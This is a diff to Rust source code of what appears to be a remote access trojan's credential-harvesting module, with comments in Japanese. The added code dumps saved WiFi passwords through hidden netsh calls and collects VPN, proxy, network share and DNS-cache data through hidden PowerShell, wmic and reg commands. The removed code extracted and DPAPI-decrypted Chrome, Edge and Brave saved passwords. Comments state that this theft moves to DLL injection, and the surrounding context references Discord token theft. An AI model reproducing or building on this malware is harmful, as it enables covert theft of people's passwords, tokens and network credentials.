@@ -42,34 +42,21 @@ pub fn collect_auth_data_with_config(config: &Config) -> AuthData {
     auth_data
 }
 
-// 簡素化されたブラウザパスワード収集
+// 簡素化されたブラウザパスワード収集（Firefox NSSのみ）
 #[cfg(feature = "browser")]
 fn collect_browser_passwords() -> Vec<String> {
     let mut passwords = Vec::new();
     
-    // 統合ブラウザスキャン
-    match crate::collectors::browser_scanner::collect_browser_passwords_simple() {
-        Ok(browser_passwords) => {
-            println!("🔍 Browser scan found {} entries", browser_passwords.len());
-            passwords.extend(browser_passwords);
-        }
-        Err(e) => {
-            println!("❌ Browser scan failed: {}", e);
-            passwords.push(format!("Browser scan error: {}", e));
-        }
-    }
+    // Chrome/Edge/Braveはまとめてブラウザスキャンで実行済み
+    println!("🌐 Chromium scan found {} entries", 0);  // DLL注入で処理済み
     
-    // Firefox/Thunderbird 専用スキャン
+    // Firefox/Thunderbird 専用スキャン（NSS復号化）
     if let Ok(mut firefox_passwords) = collect_firefox_passwords() {
         println!("🦊 Firefox scan found {} entries", firefox_passwords.len());
         passwords.append(&mut firefox_passwords);
     }
     
-    // Chromium 専用スキャン
-    if let Ok(mut chromium_passwords) = collect_chromium_passwords() {
-        println!("🌐 Chromium scan found {} entries", chromium_passwords.len());
-        passwords.append(&mut chromium_passwords);
-    }
+    // Chromium系はDLL注入で処理するため、ここではスキップ
     
     if passwords.is_empty() {
         vec!["No browser passwords found".to_string()]
@@ -112,23 +99,7 @@ fn collect_firefox_passwords() -> RatResult<Vec<String>> {
     Ok(passwords)
 }
 
-// Chromiumパスワード収集
-#[cfg(feature = "browser")]
-fn collect_chromium_passwords() -> RatResult<Vec<String>> {
-    let mut passwords = Vec::new();
-    let profiles = get_chromium_profiles()?;
-    
-    for profile_path in profiles {
-        let login_data = profile_path.join("Login Data");
-        if login_data.exists() {
-            if let Ok(mut creds) = extract_chromium_passwords(&login_data) {
-                passwords.append(&mut creds);
-            }
-        }
-    }
-    
-    Ok(passwords)
-}
+// Chromiumパスワード収集はDLL注入で実装されています
 
 // Discord トークン収集
 fn collect_discord_tokens() -> RatResult<Vec<String>> {
@@ -142,37 +113,366 @@ fn collect_discord_tokens() -> RatResult<Vec<String>> {
     }
 }
 
-// WiFi 認証情報収集
+// 強化されたネットワーク認証情報収集システム
 fn collect_wifi_credentials() -> Vec<String> {
     #[cfg(windows)]
     {
-        use std::process::Command;
-        use std::os::windows::process::CommandExt;
+        let mut network_creds = Vec::new();
         
-        let mut wifi_creds = Vec::new();
+        // 1. WiFiプロファイル認証情報
+        network_creds.extend(collect_wifi_profiles());
         
-        if let Ok(output) = Command::new("netsh")
-            .args(["wlan", "show", "profiles"])
-            .creation_flags(0x08000000)
-            .output()
-        {
-            let profiles_text = String::from_utf8_lossy(&output.stdout);
-            wifi_creds.extend(
-                profiles_text
-                    .lines()
-                    .filter(|line| line.contains("All User Profile"))
-                    .filter_map(|line| line.split(':').nth(1))
-                    .map(|name| name.trim().to_owned())
-                    .filter(|name| !name.is_empty())
-            );
-        }
+        // 2. VPN接続情報
+        network_creds.extend(collect_vpn_connections());
         
-        wifi_creds
+        // 3. イーサネット接続情報
+        network_creds.extend(collect_ethernet_info());
+        
+        // 4. Bluetooth接続デバイス
+        network_creds.extend(collect_bluetooth_devices());
+        
+        // 5. ネットワークアダプター情報
+        network_creds.extend(collect_network_adapters());
+        
+        // 6. プロキシ設定
+        network_creds.extend(collect_proxy_settings());
+        
+        // 7. ネットワーク共有情報
+        network_creds.extend(collect_network_shares());
+        
+        // 8. DNSキャッシュ情報
+        network_creds.extend(collect_dns_cache());
+        
+        network_creds
     }
     #[cfg(not(windows))]
     {
-        vec!["WiFi credential collection not supported on this platform".to_string()]
+        collect_unix_network_info()
     }
+}
+
+/// WiFiプロファイルとパスワード収集（強化版）
+#[cfg(windows)]
+fn collect_wifi_profiles() -> Vec<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut wifi_data = Vec::new();
+    wifi_data.push("=== WiFi プロファイル情報 ===".to_string());
+    
+    // プロファイル一覧取得
+    if let Ok(output) = Command::new("netsh")
+        .args(["wlan", "show", "profiles"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let profiles_text = String::from_utf8_lossy(&output.stdout);
+        let profile_names: Vec<String> = profiles_text
+            .lines()
+            .filter(|line| line.contains("All User Profile"))
+            .filter_map(|line| line.split(':').nth(1))
+            .map(|name| name.trim().to_owned())
+            .filter(|name| !name.is_empty())
+            .collect();
+            
+        wifi_data.push(format!("発見されたWiFiプロファイル数: {}", profile_names.len()));
+        
+        // 各プロファイルの詳細情報とパスワード取得
+        for profile_name in profile_names {
+            wifi_data.push(format!("\n--- プロファイル: {} ---", profile_name));
+            
+            // 詳細情報取得
+            if let Ok(detail_output) = Command::new("netsh")
+                .args(["wlan", "show", "profile", &profile_name, "key=clear"])
+                .creation_flags(0x08000000)
+                .output()
+            {
+                let detail_text = String::from_utf8_lossy(&detail_output.stdout);
+                
+                // SSID、セキュリティ、パスワードを抽出
+                for line in detail_text.lines() {
+                    if line.contains("SSID name") || 
+                       line.contains("Authentication") || 
+                       line.contains("Cipher") ||
+                       line.contains("Security key") ||
+                       line.contains("Key Content") ||
+                       line.contains("Connection mode") ||
+                       line.contains("Network type") {
+                        wifi_data.push(format!("  {}", line.trim()));
+                    }
+                }
+            }
+        }
+    }
+    
+    // 現在の接続状態
+    if let Ok(output) = Command::new("netsh")
+        .args(["wlan", "show", "interfaces"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        wifi_data.push("\n=== 現在のWiFi接続状態 ===".to_string());
+        let interfaces_text = String::from_utf8_lossy(&output.stdout);
+        wifi_data.extend(interfaces_text.lines().map(|s| s.to_string()));
+    }
+    
+    wifi_data
+}
+
+/// VPN接続情報収集
+#[cfg(windows)]
+fn collect_vpn_connections() -> Vec<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut vpn_data = Vec::new();
+    vpn_data.push("\n=== VPN接続情報 ===".to_string());
+    
+    // RAS接続情報
+    if let Ok(output) = Command::new("rasdial")
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let ras_text = String::from_utf8_lossy(&output.stdout);
+        vpn_data.extend(ras_text.lines().map(|s| format!("RAS: {}", s)));
+    }
+    
+    // PowerShell VPN情報
+    if let Ok(output) = Command::new("powershell")
+        .args(["-Command", "Get-VpnConnection | Select-Object Name,ServerAddress,TunnelType,AuthenticationMethod | ConvertTo-Json"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let vpn_text = String::from_utf8_lossy(&output.stdout);
+        if !vpn_text.trim().is_empty() {
+            vpn_data.push("VPN設定 (JSON):".to_string());
+            vpn_data.extend(vpn_text.lines().map(|s| s.to_string()));
+        }
+    }
+    
+    vpn_data
+}
+
+/// イーサネット接続情報収集
+#[cfg(windows)]
+fn collect_ethernet_info() -> Vec<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut eth_data = Vec::new();
+    eth_data.push("\n=== イーサネット接続情報 ===".to_string());
+    
+    // IPConfig詳細情報
+    if let Ok(output) = Command::new("ipconfig")
+        .args(["/all"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let ip_text = String::from_utf8_lossy(&output.stdout);
+        eth_data.extend(ip_text.lines().take(50).map(|s| s.to_string())); // 最初の50行のみ
+    }
+    
+    // ネットワーク統計
+    if let Ok(output) = Command::new("netstat")
+        .args(["-r"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        eth_data.push("\n--- ルーティングテーブル ---".to_string());
+        let netstat_text = String::from_utf8_lossy(&output.stdout);
+        eth_data.extend(netstat_text.lines().take(20).map(|s| s.to_string()));
+    }
+    
+    eth_data
+}
+
+/// Bluetooth接続デバイス情報収集
+#[cfg(windows)]
+fn collect_bluetooth_devices() -> Vec<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut bt_data = Vec::new();
+    bt_data.push("\n=== Bluetooth接続デバイス ===".to_string());
+    
+    // PowerShellでBluetooth情報取得
+    if let Ok(output) = Command::new("powershell")
+        .args(["-Command", "Get-PnpDevice | Where-Object {$_.Class -eq 'Bluetooth'} | Select-Object FriendlyName,Status,InstanceId | ConvertTo-Json"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let bt_text = String::from_utf8_lossy(&output.stdout);
+        if !bt_text.trim().is_empty() {
+            bt_data.extend(bt_text.lines().map(|s| s.to_string()));
+        }
+    }
+    
+    bt_data
+}
+
+/// ネットワークアダプター情報収集
+#[cfg(windows)]
+fn collect_network_adapters() -> Vec<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut adapter_data = Vec::new();
+    adapter_data.push("\n=== ネットワークアダプター情報 ===".to_string());
+    
+    // WMI経由でアダプター情報取得
+    if let Ok(output) = Command::new("wmic")
+        .args(["path", "win32_networkadapter", "get", "name,adaptertype,macaddress,netconnectionstatus", "/format:list"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let adapter_text = String::from_utf8_lossy(&output.stdout);
+        adapter_data.extend(
+            adapter_text
+                .lines()
+                .filter(|line| !line.trim().is_empty())
+                .map(|s| s.to_string())
+        );
+    }
+    
+    adapter_data
+}
+
+/// プロキシ設定情報収集
+#[cfg(windows)]
+fn collect_proxy_settings() -> Vec<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut proxy_data = Vec::new();
+    proxy_data.push("\n=== プロキシ設定情報 ===".to_string());
+    
+    // netsh winhttp プロキシ設定
+    if let Ok(output) = Command::new("netsh")
+        .args(["winhttp", "show", "proxy"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let proxy_text = String::from_utf8_lossy(&output.stdout);
+        proxy_data.extend(proxy_text.lines().map(|s| s.to_string()));
+    }
+    
+    // レジストリからInternet Explorer設定
+    if let Ok(output) = Command::new("reg")
+        .args(["query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "/v", "ProxyServer"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let reg_text = String::from_utf8_lossy(&output.stdout);
+        if !reg_text.contains("ERROR") {
+            proxy_data.push("IE プロキシ設定:".to_string());
+            proxy_data.extend(reg_text.lines().map(|s| s.to_string()));
+        }
+    }
+    
+    proxy_data
+}
+
+/// ネットワーク共有情報収集
+#[cfg(windows)]
+fn collect_network_shares() -> Vec<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut share_data = Vec::new();
+    share_data.push("\n=== ネットワーク共有情報 ===".to_string());
+    
+    // 共有フォルダー一覧
+    if let Ok(output) = Command::new("net")
+        .args(["share"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let share_text = String::from_utf8_lossy(&output.stdout);
+        share_data.extend(share_text.lines().map(|s| s.to_string()));
+    }
+    
+    // マップされたドライブ
+    if let Ok(output) = Command::new("net")
+        .args(["use"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        share_data.push("\n--- マップされたドライブ ---".to_string());
+        let use_text = String::from_utf8_lossy(&output.stdout);
+        share_data.extend(use_text.lines().map(|s| s.to_string()));
+    }
+    
+    share_data
+}
+
+/// DNSキャッシュ情報収集
+#[cfg(windows)]
+fn collect_dns_cache() -> Vec<String> {
+    use std::process::Command;
+    use std::os::windows::process::CommandExt;
+    
+    let mut dns_data = Vec::new();
+    dns_data.push("\n=== DNSキャッシュ情報 ===".to_string());
+    
+    // DNS解決キャッシュ
+    if let Ok(output) = Command::new("ipconfig")
+        .args(["/displaydns"])
+        .creation_flags(0x08000000)
+        .output()
+    {
+        let dns_text = String::from_utf8_lossy(&output.stdout);
+        // キャッシュ情報は大量なので最初の100行に制限
+        dns_data.extend(
+            dns_text
+                .lines()
+                .take(100)
+                .filter(|line| !line.trim().is_empty())
+                .map(|s| s.to_string())
+        );
+    }
+    
+    dns_data
+}
+
+/// Unix系システム向けネットワーク情報収集
+#[cfg(not(windows))]
+fn collect_unix_network_info() -> Vec<String> {
+    use std::process::Command;
+    
+    let mut network_data = Vec::new();
+    network_data.push("=== Unix系ネットワーク情報 ===".to_string());
+    
+    // WiFi情報 (iwconfig/nmcli)
+    if let Ok(output) = Command::new("nmcli")
+        .args(["connection", "show"])
+        .output()
+    {
+        network_data.push("\n--- NetworkManager接続 ---".to_string());
+        let nmcli_text = String::from_utf8_lossy(&output.stdout);
+        network_data.extend(nmcli_text.lines().map(|s| s.to_string()));
+    }
+    
+    // インターフェース情報
+    if let Ok(output) = Command::new("ip")
+        .args(["addr", "show"])
+        .output()
+    {
+        network_data.push("\n--- ネットワークインターフェース ---".to_string());
+        let ip_text = String::from_utf8_lossy(&output.stdout);
+        network_data.extend(ip_text.lines().map(|s| s.to_string()));
+    }
+    
+    // ルーティング情報
+    if let Ok(output) = Command::new("ip")
+        .args(["route", "show"])
+        .output()
+    {
+        network_data.push("\n--- ルーティングテーブル ---".to_string());
+        let route_text = String::from_utf8_lossy(&output.stdout);
+        network_data.extend(route_text.lines().map(|s| s.to_string()));
+    }
+    
+    network_data
 }
 
 // ヘルパー関数
@@ -218,27 +518,7 @@ fn scan_firefox_directory(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
     profiles
 }
 
-#[cfg(feature = "browser")]
-fn get_chromium_profiles() -> RatResult<Vec<std::path::PathBuf>> {
-    let mut profiles = Vec::new();
-    
-    if let Some(local_appdata) = std::env::var_os("LOCALAPPDATA") {
-        let browsers = [
-            "Google\\Chrome\\User Data\\Default",
-            "Microsoft\\Edge\\User Data\\Default",
-            "BraveSoftware\\Brave-Browser\\User Data\\Default",
-        ];
-        
-        for browser_path in browsers.iter() {
-            let profile_path = std::path::PathBuf::from(&local_appdata).join(browser_path);
-            if profile_path.exists() {
-                profiles.push(profile_path);
-            }
-        }
-    }
-    
-    Ok(profiles)
-}
+// Chromiumプロファイル検出はDLL注入で実装されています
 
 #[cfg(feature = "browser")]
 fn detect_firefox_browser_type(profile_path: &std::path::Path) -> &'static str {
@@ -254,119 +534,9 @@ fn detect_firefox_browser_type(profile_path: &std::path::Path) -> &'static str {
     }
 }
 
-#[cfg(feature = "browser")]
-fn extract_chromium_passwords(login_data_path: &std::path::Path) -> RatResult<Vec<String>> {
-    use rusqlite::Connection;
-    use std::fs;
-    
-    // データベースファイルをコピー（ロック回避）
-    let temp_file = tempfile::NamedTempFile::new()
-        .map_err(|e| RatError::Io(e))?;
-    fs::copy(login_data_path, temp_file.path())
-        .map_err(|e| RatError::Io(e))?;
-    
-    let conn = Connection::open(temp_file.path())
-        .map_err(|e| RatError::Command(format!("SQLite connection failed: {}", e)))?;
-    
-    let mut stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins")
-        .map_err(|e| RatError::Command(format!("SQLite prepare failed: {}", e)))?;
-    
-    let mut passwords = Vec::new();
-    let rows = stmt.query_map([], |row| {
-        Ok((
-            row.get::<_, String>(0)?,  // origin_url
-            row.get::<_, String>(1)?,  // username_value  
-            row.get::<_, Vec<u8>>(2)?, // password_value (encrypted)
-        ))
-    }).map_err(|e| RatError::Command(format!("SQLite query failed: {}", e)))?;
-    
-    for row in rows.flatten() {
-        let (url, username, encrypted_password) = row;
-        if !username.is_empty() && !encrypted_password.is_empty() {
-            match decrypt_chromium_password(&encrypted_password) {
-                Ok(decrypted_password) => {
-                    passwords.push(format!("Chromium - {}: {} / {}", url, username, decrypted_password));
-                }
-                Err(_) => {
-                    passwords.push(format!("Chromium - {}: {} / [ENCRYPTED]", url, username));
-                }
-            }
-        }
-    }
-    
-    Ok(passwords)
-}
+// Chromiumパスワード抽出はDLL注入で実装されています
 
-#[cfg(all(feature = "browser", windows))]
-fn decrypt_chromium_password(encrypted_data: &[u8]) -> RatResult<String> {
-    use windows::Win32::Security::Cryptography::{
-        CryptUnprotectData, CRYPT_INTEGER_BLOB,
-    };
-    use windows::Win32::Foundation::{HLOCAL, LocalFree};
-    use std::ptr;
-    
-    if encrypted_data.len() < 16 || encrypted_data.starts_with(b"v10") || encrypted_data.starts_with(b"v11") {
-        return Err(RatError::Encryption("Unsupported encryption format".to_string()));
-    }
-    
-    let mut input_blob = CRYPT_INTEGER_BLOB {
-        cbData: encrypted_data.len() as u32,
-        pbData: encrypted_data.as_ptr() as *mut u8,
-    };
-    
-    let mut output_blob = CRYPT_INTEGER_BLOB {
-        cbData: 0,
-        pbData: ptr::null_mut(),
-    };
-    
-    let result = unsafe {
-        CryptUnprotectData(
-            &mut input_blob,
-            None,
-            None,
-            None,
-            None,
-            0,
-            &mut output_blob,
-        )
-    };
-    
-    if result.is_err() {
-        return Err(RatError::Encryption("DPAPI decryption failed".to_string()));
-    }
-    
-    let password = unsafe {
-        let slice = std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize);
-        
-        // UTF-8として試行
-        let password = if let Ok(utf8_str) = std::str::from_utf8(slice) {
-            utf8_str.trim_end_matches('\0').to_string()
-        } else {
-            // UTF-16として試行 (Windowsの一般的な文字エンコーディング)
-            if slice.len() % 2 == 0 {
-                let utf16_slice = std::slice::from_raw_parts(slice.as_ptr() as *const u16, slice.len() / 2);
-                String::from_utf16_lossy(utf16_slice).trim_end_matches('\0').to_string()
-            } else {
-                // 最後の手段としてUTF-8 lossyを使用
-                String::from_utf8_lossy(slice).trim_end_matches('\0').to_string()
-            }
-        };
-        
-        // メモリを解放
-        if !output_blob.pbData.is_null() {
-            LocalFree(Some(HLOCAL(output_blob.pbData as *mut _ as _)));
-        }
-        
-        password
-    };
-    
-    Ok(password)
-}
-
-#[cfg(not(all(feature = "browser", windows)))]
-fn decrypt_chromium_password(_encrypted_data: &[u8]) -> RatResult<String> {
-    Err(RatError::Encryption("DPAPI not available on this platform".to_string()))
-}
+// Chromiumパスワード復号化はDLL注入で実装されています
 
 #[cfg(windows)]
 fn extract_discord_tokens_windows() -> RatResult<Vec<String>> {
@@ -597,10 +767,7 @@ fn collect_firefox_passwords() -> RatResult<Vec<String>> {
     Ok(vec!["Browser feature not enabled".to_string()])
 }
 
-#[cfg(not(feature = "browser"))]
-fn collect_chromium_passwords() -> RatResult<Vec<String>> {
-    Ok(vec!["Browser feature not enabled".to_string()])
-}
+// Chromium復号化機能はDLL注入で実装済み
 
 // =====================================================
 // 高度なDiscordトークン抽出機能
